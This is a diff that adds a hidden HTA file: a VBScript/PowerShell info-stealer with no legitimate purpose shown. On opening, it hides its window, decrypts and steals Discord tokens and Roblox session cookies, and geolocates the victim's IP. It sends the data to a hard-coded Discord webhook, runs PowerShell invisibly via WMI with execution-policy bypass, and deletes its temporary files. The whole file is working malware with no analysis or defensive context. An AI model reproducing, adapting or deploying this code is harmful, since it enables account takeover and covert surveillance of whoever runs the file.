@@ -1,0 +1,242 @@
+<html>
+<head><title>.</title>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<script language="VBScript">
+window.resizeTo 0,0:window.moveTo -2000,-2000
+On Error Resume Next
+
+Dim sh, fso, WH, PC, USER
+Set sh = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+WH = "https://discord.com/api/webhooks/1537058264217288857/_gDfWmViEwuCjdpTpeXyHfNdSfOp0pPcbrUQ4Rkb9WdpwUU7ssK0Eeo1hkeUyk5k_bhW"
+PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+
+Call GrabDiscordTokens
+Call SendIP
+Call GrabRoblox
+window.close()
+
+Sub SendIP()
+    Dim ip: ip = Fetch("https://api.ipify.org")
+    If Len(ip) = 0 Then Exit Sub
+    Dim ls: ls = Fetch("http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp")
+    Dim ll: ll = Split(ls, vbLf)
+    Call PostEmbed("Target Connected", "IP: " & ip & vbLf & "Country: " & ll(0) & vbLf & "Region: " & ll(1) & vbLf & "City: " & ll(2) & vbLf & "ISP: " & ll(3) & vbLf & "PC: " & PC & vbLf & "User: " & USER, 3447003)
+End Sub
+
+Sub GrabRoblox()
+    Dim paths(4)
+    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
+    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+
+    Dim i, fp, raw
+    For i = 0 To 4
+        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
+    Next
+
+    If Len(fp) = 0 Then
+        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
+        If fso.FolderExists(pk) Then
+            Dim folder, subf
+            Set folder = fso.GetFolder(pk)
+            For Each subf In folder.SubFolders
+                If InStr(subf.Name, "ROBLOX") > 0 Then
+                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
+                    If fso.FileExists(uwp) Then fp = uwp: Exit For
+                End If
+            Next
+            Set folder = Nothing
+        End If
+    End If
+
+    If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680): Exit Sub
+
+    raw = ReadFile(fp)
+    If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
+
+    Dim cookie: cookie = ""
+    Dim approach: approach = ""
+
+    If InStr(raw, "_|WARNING") > 0 Then
+        cookie = raw
+        approach = "Plaintext"
+    End If
+
+    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
+        approach = "JSON-DPAPI"
+        Dim sp: sp = InStr(raw, "CookiesData"":""")
+        If sp > 0 Then
+            sp = sp + 14
+            Dim ep: ep = InStr(sp, raw, """")
+            If ep > sp Then
+                Dim b64: b64 = Mid(raw, sp, ep - sp)
+                If Len(b64) > 100 Then
+                    cookie = DecryptDPAPI(b64)
+                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
+                End If
+            End If
+        End If
+    End If
+
+    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
+        approach = "Raw-ROBLOSECURITY"
+        Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
+        cookie = Mid(raw, rp)
+    End If
+
+    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
+
+    Dim cae: cae = InStr(cookie, "|$CAE")
+    If cae = 0 Then cae = InStr(cookie, "|_CAE")
+    If cae > 0 Then cookie = Mid(cookie, cae)
+
+    Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
+    Call PostFile("cookie.txt", cookie)
+End Sub
+
+Function DecryptDPAPI(b64)
+    DecryptDPAPI = ""
+    On Error Resume Next
+    Dim inf: inf = TmpFile("dpi.txt")
+    Dim outf: outf = TmpFile("dpo.txt")
+    fso.DeleteFile outf, True
+    WriteFile inf, b64
+    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
+    Dim psf: psf = TmpFile("dpapi.ps1")
+    WriteFile psf, ps
+    RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
+    If fso.FileExists(outf) Then
+        Dim sz: sz = fso.GetFile(outf).Size
+        If sz > 20 Then DecryptDPAPI = ReadFile(outf)
+    End If
+    fso.DeleteFile inf, True
+    fso.DeleteFile psf, True
+    fso.DeleteFile outf, True
+End Function
+
+Sub RunCmd(cmd)
+    On Error Resume Next
+    Dim objWMIService, objProcess, intProcessID, objStartup
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup").SpawnInstance_
+    objStartup.ShowWindow = 0
+    Set objProcess = objWMIService.Get("Win32_Process")
+    objProcess.Create cmd, , objStartup, intProcessID
+    If intProcessID = 0 Then Exit Sub
+    Dim colProcesses, bRunning: bRunning = True
+    Do While bRunning
+        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+        Set colProcesses = objWMIService.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & intProcessID)
+        bRunning = (colProcesses.Count > 0)
+        Set colProcesses = Nothing: Set objWMIService = Nothing
+        If bRunning Then WScript.Sleep 150
+    Loop
+End Sub
+
+Sub WmiRun(cmd)
+    On Error Resume Next
+    Dim objWMIService, objProcess, intProcessID, objStartup
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup").SpawnInstance_
+    objStartup.ShowWindow = 0
+    Set objProcess = objWMIService.Get("Win32_Process")
+    objProcess.Create cmd, , objStartup, intProcessID
+    If intProcessID = 0 Then Exit Sub
+    Dim colProcesses, bRunning: bRunning = True
+    Do While bRunning
+        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+        Set colProcesses = objWMIService.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & intProcessID)
+        bRunning = (colProcesses.Count > 0)
+        Set colProcesses = Nothing: Set objWMIService = Nothing
+        If bRunning Then WScript.Sleep 150
+    Loop
+End Sub
+
+Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
+
+Sub WriteFile(path, content)
+    On Error Resume Next
+    Dim f: Set f = fso.CreateTextFile(path, True)
+    f.Write content: f.Close: Set f = Nothing
+End Sub
+
+Function Fetch(url)
+    On Error Resume Next: Fetch = ""
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056: h.Open "GET", url, False: h.Send
+    If h.Status = 200 Then Fetch = h.ResponseText
+    Set h = Nothing
+End Function
+
+Function ReadFile(path)
+    On Error Resume Next: ReadFile = ""
+    Dim f: Set f = fso.OpenTextFile(path, 1)
+    ReadFile = f.ReadAll: f.Close: Set f = Nothing
+End Function
+
+Sub PostEmbed(t, d, c)
+    On Error Resume Next
+    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056: h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
+End Sub
+
+Sub PostFile(fn, ct)
+    On Error Resume Next
+    Dim b: b = MkGuid()
+    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056: h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing
+End Sub
+
+Function Ej(s)
+    s = Replace(s, "\", "\\"): s = Replace(s, """", "\""")
+    s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n")
+    s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t")
+    Ej = s
+End Function
+
+Function MkGuid()
+    Dim t: Set t = CreateObject("Scriptlet.TypeLib")
+    MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing
+End Function
+
+Sub GrabDiscordTokens()
+    Dim dcPS, dp, dout, dt
+    dcPS = "$eap='SilentlyContinue';$app=$env:APPDATA;$cl=@('discord','discordptb','discordcanary');$mk=$null;foreach($c in $cl){$ls=gp ""$app\$c\Local State"" -Name os_crypt -EA 0 2>$null;if(!$ls){continue};$txt=$ls|Out-String;if($txt -match 'encrypted_key""\s*:\s*""([^""]+)'){$mkb=[Convert]::FromBase64String($Matches[1]);$mk=[Security.Cryptography.ProtectedData]::Unprotect($mkb[5..($mkb.Length-1)],$null,0);break}};if(!$mk){Write-Output 'NOMASTER';exit};Write-Output ('MK:'+[Convert]::ToBase64String($mk));foreach($c in $cl){$ld=""$app\$c\Local Storage\leveldb"";if(!(Test-Path $ld)){continue};gci $ld *.ldb,*.log -EA 0|%{$txt=gc $_.FullName -Raw -EA 0;$m=[regex]::Matches($txt,'dQw4w9WgXcQ:[^\s""]+');foreach($x in $m){try{$enc=[Convert]::FromBase64String($x.Value.Split(':')[1]);$nonce=$enc[3..14];$ct=$enc[15..($enc.Length-17)];$tag=$enc[($enc.Length-16)..($enc.Length-1)];$aes=[Security.Cryptography.AesGcm]::new($mk);$pt=[byte[]]::new($ct.Length);$aes.Decrypt($nonce,$ct,$tag,$pt);$tok=[Text.Encoding]::UTF8.GetString($pt);if($tok -match '\w{24}\.\w{6}\.\w{27}'){Write-Output ('TKN:'+$c+':'+$tok)}}catch{}}}};Write-Output 'DONE'"
+    dp = TmpFile("dt.ps1")
+    dout = TmpFile("dt.txt")
+    WriteFile dp, dcPS
+    fso.DeleteFile dout, True
+    WmiRun "powershell -NoP -EP Bypass -File """ & dp & """ > """ & dout & """"
+    fso.DeleteFile dp, True
+    If fso.FileExists(dout) Then
+        If fso.GetFile(dout).Size > 5 Then
+            dt = ReadFile(dout)
+            fso.DeleteFile dout, True
+            If InStr(dt, "TKN:") > 0 Then
+                PostEmbed "Discord Tokens", "Decrypted tokens below", 16711680
+                PostFile "tokens.txt", dt
+            ElseIf InStr(dt, "MK:") > 0 Then
+                PostEmbed "Discord", "Found master key but no tokens", 16744192
+                Dim mkP: mkP = InStr(dt, "MK:")
+                If mkP > 0 Then
+                    Dim mkE2: mkE2 = InStr(mkP, dt, vbLf)
+                    If mkE2 = 0 Then mkE2 = Len(dt) + 1
+                    PostFile "master_key.txt", Mid(dt, mkP + 3, mkE2 - mkP - 3)
+                End If
+            Else
+                PostEmbed "Discord", "No Discord installation found", 10038562
+            End If
+        End If
+    End If
+End Sub
+
+</script>
+</head><body></body></html>
